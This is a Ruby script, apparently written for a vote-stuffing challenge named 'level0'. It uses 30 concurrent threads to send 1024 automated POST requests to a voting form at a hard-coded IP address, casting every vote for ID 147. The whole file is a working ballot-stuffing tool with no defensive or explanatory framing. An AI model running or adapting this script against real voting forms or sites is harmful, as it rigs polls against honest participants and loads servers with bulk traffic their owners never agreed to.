#!/usr/bin/ruby
require 'net/http'
require 'uri'
require 'thread'

#configuration start
url = 'http://173.246.108.142/level0.php'
id_number = 147
thread_limit = 30
votes = 1024
#configuration end

uri = URI.parse(url)
params = {id: id_number, holdthedoor: "Submit"}

def thread_it(uri, params)
  Net::HTTP.post_form(uri, params)
end

$results = []

def thread_wait(threads)
  threads.each{|t| t.join}
  threads.each {|t| $results << t }
  threads.delete_if {|t| t.status == false}
  threads.delete_if {|t| t.status.nil? }
end

opts = {}
threads = []
for r in 1..votes
  puts "Vote #{r}"
  thread_wait(threads) while threads.length >= thread_limit
  t = Thread.new { thread_it(uri, params) }
  t.abort_on_exception = true
  threads << t
end
# Ensure remaining threads complete
threads.each{|t| t.join}
